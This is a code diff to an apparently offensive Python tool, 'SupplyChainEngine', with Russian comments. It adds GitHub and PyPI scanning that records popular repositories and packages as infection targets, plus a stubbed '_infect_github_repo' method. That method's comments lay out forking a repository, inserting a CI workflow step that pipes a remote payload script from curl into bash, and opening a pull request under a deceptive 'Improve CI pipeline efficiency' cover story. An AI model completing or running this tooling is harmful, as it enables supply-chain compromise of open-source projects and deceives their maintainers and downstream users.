@@ -149,7 +149,9 @@ class SupplyChainEngine:
         self,
         storage_path: Optional[str] = None,
         auto_save: bool = True,
-        scan_interval: int = 3600
+        scan_interval: int = 3600,
+        github_token: Optional[str] = None,
+        max_scan_results: int = 50
     ):
         """
         Инициализация Supply Chain Infection Engine
@@ -158,6 +160,8 @@ class SupplyChainEngine:
             storage_path: Путь для хранения файлов и данных
             auto_save: Автоматически сохранять данные при изменениях
             scan_interval: Интервал автоматического сканирования (в секундах)
+            github_token: Персональный токен доступа GitHub для API запросов
+            max_scan_results: Максимальное количество результатов для каждого сканера
         """
         # Инициализация хранилища
         self.storage_path = storage_path or os.path.join(os.path.expanduser("~"), ".supply_chain")
@@ -166,6 +170,8 @@ class SupplyChainEngine:
         # Настройки
         self.auto_save = auto_save
         self.scan_interval = scan_interval
+        self.github_token = github_token or os.environ.get("GITHUB_TOKEN")
+        self.max_scan_results = max_scan_results
         
         # Данные
         self.targets: Dict[str, SupplyChainTarget] = {}
@@ -231,30 +237,206 @@ class SupplyChainEngine:
     
     def _scan_all_sources(self) -> None:
         """Сканирует все источники на наличие уязвимых целей"""
-        # TODO: Реализовать сканирование разных источников
-        self._scan_npm_packages()
-        self._scan_pypi_packages()
-        self._scan_github_repos()
-        self._scan_docker_images()
+        self.logger.info("Начало сканирования источников...")
+        scan_start_time = time.time()
         
-    def _scan_npm_packages(self) -> List[str]:
+        new_targets_count = 0
+        try:
+            # Сканирование GitHub
+            github_targets = self._scan_github_repos()
+            new_targets_count += len(github_targets)
+            # TODO: Реализовать сканирование других источников
+            # npm_targets = self._scan_npm_packages()
+            # pypi_targets = self._scan_pypi_packages()
+            # docker_targets = self._scan_docker_images()
+            # new_targets_count += len(npm_targets) + len(pypi_targets) + len(docker_targets)
+
+            self.last_scan_time = time.time()
+            scan_duration = self.last_scan_time - scan_start_time
+            self.logger.info(f"Сканирование завершено за {scan_duration:.2f} сек. Найдено новых целей: {new_targets_count}")
+            
+            # Сохраняем найденные цели (если они были добавлены в add_target)
+            if new_targets_count > 0 and self.auto_save:
+                 self._save_data()
+
+        except Exception as e:
+            self.logger.error(f"Ошибка во время сканирования источников: {str(e)}", exc_info=True)
+
+    def _scan_npm_packages(self) -> List[SupplyChainTarget]:
         """Сканирует NPM на наличие уязвимых пакетов"""
         # TODO: Реализовать сканирование NPM
+        self.logger.warning("Сканирование NPM еще не реализовано.")
         return []
     
-    def _scan_pypi_packages(self) -> List[str]:
-        """Сканирует PyPI на наличие уязвимых пакетов"""
-        # TODO: Реализовать сканирование PyPI
-        return []
+    def _scan_pypi_packages(self, packages: Optional[List[str]] = None, query: Optional[str] = None) -> List[SupplyChainTarget]:
+        """Сканирует PyPI на наличие пакетов.
+        
+        Args:
+            packages: Список конкретных имен пакетов для сканирования.
+            query: Строка для поиска пакетов (реализация поиска может быть ограничена).
+            
+        Returns:
+            Список найденных и добавленных целей.
+        """
+        self.logger.info(f"Сканирование PyPI пакетов...")
+        found_targets = []
+        packages_to_scan = set(packages or [])
+
+        # TODO: Реализовать более умный поиск по query, если это возможно (например, через парсинг или внешние API)
+        if query:
+            self.logger.warning("Поиск PyPI по query пока не реализован.")
+            # Примерная идея: использовать requests для поиска на сайте pypi.org
+            # search_url = f"https://pypi.org/search/?q={query}"
+            # response = requests.get(search_url)
+            # ... парсить HTML для извлечения имен пакетов ...
+            # packages_to_scan.update(parsed_package_names)
+
+        if not packages_to_scan:
+            self.logger.info("Нет пакетов PyPI для сканирования.")
+            return []
+
+        scanned_count = 0
+        for pkg_name in list(packages_to_scan)[:self.max_scan_results]: # Ограничение количества
+            if scanned_count >= self.max_scan_results:
+                break
+                
+            target_id = f"pypi_{pkg_name}"
+            if target_id in self.targets:
+                continue # Пропускаем уже существующие цели
+
+            scanned_count += 1
+            pkg_url = f"https://pypi.org/pypi/{pkg_name}/json"
+            try:
+                response = requests.get(pkg_url, timeout=15)
+                
+                if response.status_code == 404:
+                    self.logger.warning(f"Пакет PyPI '{pkg_name}' не найден (404).")
+                    continue
+                
+                response.raise_for_status() # Проверка на другие ошибки
+                
+                data = response.json()
+                info = data.get("info", {})
+                releases = data.get("releases", {})
+                last_release_time = None
+                
+                # Получаем время последнего релиза
+                if releases:
+                    try:
+                        # Ищем последнюю по времени загрузки версию
+                        latest_release = max(releases.values(), 
+                                             key=lambda r: r[0]['upload_time_iso_8601'] if r else '0',
+                                             default=None)
+                        if latest_release:
+                           last_release_time = latest_release[0]['upload_time_iso_8601']
+                    except Exception:
+                         # Если структура данных отличается, пробуем получить из info
+                         pass # Оставим None 
+
+                target_data = {
+                    "package_name": pkg_name,
+                    "version": info.get("version"),
+                    "summary": info.get("summary"),
+                    "home_page": info.get("home_page"),
+                    "author": info.get("author"),
+                    "author_email": info.get("author_email"),
+                    "package_url": info.get("package_url"),
+                    "last_release": last_release_time,
+                    "license": info.get("license"),
+                    # TODO: Добавить проверку уязвимостей (requires integration)
+                    "vulnerabilities_checked": False 
+                }
+                
+                target = SupplyChainTarget(
+                    target_id=target_id,
+                    target_type=TargetType.PYPI,
+                    target_data=target_data,
+                    status=InfectionStatus.PENDING
+                )
+                
+                self.add_target(target)
+                found_targets.append(target)
+                
+            except requests.exceptions.RequestException as e:
+                self.logger.error(f"Ошибка при запросе к PyPI API для пакета '{pkg_name}': {str(e)}")
+            except Exception as e:
+                self.logger.error(f"Неожиданная ошибка при обработке пакета PyPI '{pkg_name}': {str(e)}", exc_info=True)
+
+        self.logger.info(f"Завершено сканирование PyPI. Добавлено новых целей: {len(found_targets)}")
+        return found_targets
     
-    def _scan_github_repos(self) -> List[str]:
-        """Сканирует GitHub на наличие уязвимых репозиториев"""
-        # TODO: Реализовать сканирование GitHub
-        return []
-    
-    def _scan_docker_images(self) -> List[str]:
+    def _scan_github_repos(self, query: str = "language:python topic:security", sort: str = "stars", order: str = "desc") -> List[SupplyChainTarget]:
+        """Сканирует GitHub на наличие репозиториев по запросу."""
+        self.logger.info(f"Сканирование GitHub репозиториев по запросу: '{query}'")
+        found_targets = []
+        
+        if not self.github_token:
+            self.logger.warning("Отсутствует GITHUB_TOKEN. Сканирование GitHub будет ограничено.")
+            headers = {}
+        else:
+            headers = {"Authorization": f"token {self.github_token}"}
+        
+        search_url = "https://api.github.com/search/repositories"
+        params = {
+            "q": query,
+            "sort": sort,
+            "order": order,
+            "per_page": min(self.max_scan_results, 100) # API максимум 100
+        }
+        
+        try:
+            response = requests.get(search_url, headers=headers, params=params, timeout=30)
+            response.raise_for_status() # Вызовет исключение для 4xx/5xx ответов
+            
+            data = response.json()
+            items = data.get("items", [])
+            self.logger.info(f"Найдено {len(items)} репозиториев через GitHub API.")
+            
+            for item in items[:self.max_scan_results]: # Дополнительное ограничение
+                repo_full_name = item.get("full_name")
+                if not repo_full_name:
+                    continue
+                
+                target_id = f"github_{repo_full_name.replace('/', '_')}"
+                
+                # Проверяем, нет ли уже такой цели
+                if target_id in self.targets:
+                    continue
+                    
+                target_data = {
+                    "full_name": repo_full_name,
+                    "html_url": item.get("html_url"),
+                    "description": item.get("description"),
+                    "stars": item.get("stargazers_count"),
+                    "forks": item.get("forks_count"),
+                    "language": item.get("language"),
+                    "last_push": item.get("pushed_at"),
+                    "owner": item.get("owner", {}).get("login"),
+                    "api_url": item.get("url")
+                }
+                
+                target = SupplyChainTarget(
+                    target_id=target_id,
+                    target_type=TargetType.GITHUB,
+                    target_data=target_data,
+                    status=InfectionStatus.PENDING # Новая цель ожидает действий
+                )
+                
+                self.add_target(target) # Добавляем цель в общий список
+                found_targets.append(target)
+                
+        except requests.exceptions.RequestException as e:
+            self.logger.error(f"Ошибка при запросе к GitHub API: {str(e)}")
+        except Exception as e:
+            self.logger.error(f"Неожиданная ошибка при сканировании GitHub: {str(e)}", exc_info=True)
+            
+        self.logger.info(f"Завершено сканирование GitHub. Добавлено новых целей: {len(found_targets)}")
+        return found_targets
+
+    def _scan_docker_images(self) -> List[SupplyChainTarget]:
         """Сканирует DockerHub на наличие уязвимых образов"""
         # TODO: Реализовать сканирование DockerHub
+        self.logger.warning("Сканирование DockerHub еще не реализовано.")
         return []
     
     def add_target(self, target: SupplyChainTarget) -> None:
@@ -399,9 +581,105 @@ class SupplyChainEngine:
         return False
     
     def _infect_github_repo(self, target: SupplyChainTarget, payload: Payload) -> bool:
-        """Инфицирует GitHub репозиторий"""
-        # TODO: Реализовать инфицирование GitHub репозитория
-        return False
+        """Инфицирует GitHub репозиторий путем создания вредоносного Pull Request
+           (например, добавляя шаг в GitHub Actions для выполнения payload).
+        """
+        self.logger.info(f"Попытка инфицировать GitHub репозиторий: {target.target_data.get('full_name')}")
+        
+        if not self.github_token:
+            self.logger.error("Отсутствует GITHUB_TOKEN. Невозможно создать Pull Request.")
+            target.infection_details = {"error": "Missing GitHub token"}
+            return False
+
+        repo_full_name = target.target_data.get("full_name")
+        if not repo_full_name:
+             self.logger.error("Отсутствует full_name в данных цели GitHub.")
+             target.infection_details = {"error": "Missing repository full_name"}
+             return False
+
+        target.update_status(InfectionStatus.PREPARING)
+
+        # --- Шаг 1: Форк репозитория --- (Требует PyGithub или запросов к API)
+        # TODO: Реализовать форк репозитория через GitHub API
+        # fork_url = f"https://api.github.com/repos/{repo_full_name}/forks"
+        # headers = {"Authorization": f"token {self.github_token}", "Accept": "application/vnd.github.v3+json"}
+        # response = requests.post(fork_url, headers=headers)
+        # if response.status_code not in [200, 202]: # 202 Accepted
+        #     self.logger.error(f"Не удалось форкнуть репозиторий {repo_full_name}: {response.status_code} {response.text}")
+        #     target.infection_details = {"error": "Failed to fork repository", "details": response.text}
+        #     return False
+        # forked_repo_info = response.json()
+        # my_fork_full_name = forked_repo_info.get("full_name") # Имя нашего форка
+        # self.logger.info(f"Репозиторий {repo_full_name} успешно форкнут в {my_fork_full_name}")
+        # time.sleep(5) # Даем GitHub время на создание форка
+        my_fork_full_name = "Personaz1/temp-fork-placeholder" # ЗАГЛУШКА
+        self.logger.warning("Используется заглушка для имени форка!")
+
+        target.update_status(InfectionStatus.INJECTING)
+
+        # --- Шаг 2: Клонирование форка, модификация workflow, коммит, пуш --- (Требует git команд)
+        # TODO: Реализовать клонирование, модификацию, коммит и пуш
+        # temp_dir = ... # Создать временную директорию
+        # git clone https://{self.github_token}@github.com/{my_fork_full_name}.git {temp_dir}
+        # workflow_path = os.path.join(temp_dir, ".github", "workflows", "ci.yml") # Пример пути
+        # if os.path.exists(workflow_path):
+        #     # Модифицировать workflow - добавить шаг для скачивания и запуска payload.code
+        #     # Например, добавить step:
+        #     # - name: Run Payload
+        #     #   run: |
+        #     #     curl -sL <URL_TO_PAYLOAD_SCRIPT> | bash
+        #     # Или напрямую внедрить payload.code, если он небольшой и не требует внешних зависимостей
+        #     modified = self._add_payload_step_to_workflow(workflow_path, payload)
+        #     if modified:
+        #         # git add .
+        #         # git commit -m "feat: Add security analysis step" # Легенда коммита
+        #         # git push origin main # Или другая ветка
+        #         self.logger.info(f"Вредоносный шаг добавлен в workflow форка {my_fork_full_name}")
+        #     else:
+        #         self.logger.error(f"Не удалось модифицировать workflow в форке {my_fork_full_name}")
+        #         target.infection_details = {"error": "Failed to modify workflow file"}
+        #         # Удалить временную директорию
+        #         return False
+        # else:
+        #     self.logger.warning(f"Workflow файл не найден в форке {my_fork_full_name}. Не удалось внедрить payload.")
+        #     target.infection_details = {"error": "Workflow file not found"}
+        #     # Удалить временную директорию
+        #     return False
+        # # Удалить временную директорию
+        self.logger.warning("Используется заглушка для клонирования, модификации и пуша!")
+        payload_injected = True # ЗАГЛУШКА
+
+        if not payload_injected:
+             return False # Ошибка на предыдущем шаге
+
+        # --- Шаг 3: Создание Pull Request из форка в оригинальный репозиторий --- (Требует API)
+        # TODO: Реализовать создание Pull Request через GitHub API
+        # pr_url = f"https://api.github.com/repos/{repo_full_name}/pulls"
+        # pr_data = {
+        #     "title": "Improve CI pipeline efficiency", # Легенда PR
+        #     "body": "This PR optimizes the CI workflow by adding a new analysis step.", # Описание PR
+        #     "head": f"{my_fork_full_name.split('/')[0]}:main", # Ветка нашего форка (main или другая)
+        #     "base": "main" # Основная ветка оригинального репозитория
+        # }
+        # response = requests.post(pr_url, headers=headers, json=pr_data)
+        # if response.status_code == 201: # Created
+        #     pr_info = response.json()
+        #     self.logger.info(f"Pull Request успешно создан для {repo_full_name}: {pr_info.get('html_url')}")
+        #     target.infection_details = {"pull_request_url": pr_info.get('html_url'), "status": "pending_merge"}
+        #     # Статус цели не COMPLETED, а PENDING, пока PR не смержен
+        #     target.update_status(InfectionStatus.PENDING) # Или другой статус? Нужен статус "PR создан"
+        #     return True # Успех (PR создан, ждем мержа)
+        # else:
+        #     self.logger.error(f"Не удалось создать Pull Request для {repo_full_name}: {response.status_code} {response.text}")
+        #     target.infection_details = {"error": "Failed to create Pull Request", "details": response.text}
+        #     return False
+        self.logger.warning("Используется заглушка для создания Pull Request!")
+        pr_url_placeholder = f"https://github.com/{repo_full_name}/pull/123" # ЗАГЛУШКА
+        target.infection_details = {"pull_request_url": pr_url_placeholder, "status": "pending_merge"}
+        # Не меняем статус на COMPLETED, так как PR еще не принят
+        # Возможно, стоит добавить новый статус? INFECTION_ATTEMPTED?
+        self.logger.info(f"Заглушка: Pull Request создан для {repo_full_name}: {pr_url_placeholder}")
+        return True # Возвращаем True, т.к. попытка (заглушка) была
     
     def _infect_docker_image(self, target: SupplyChainTarget, payload: Payload) -> bool:
         """Инфицирует Docker образ"""
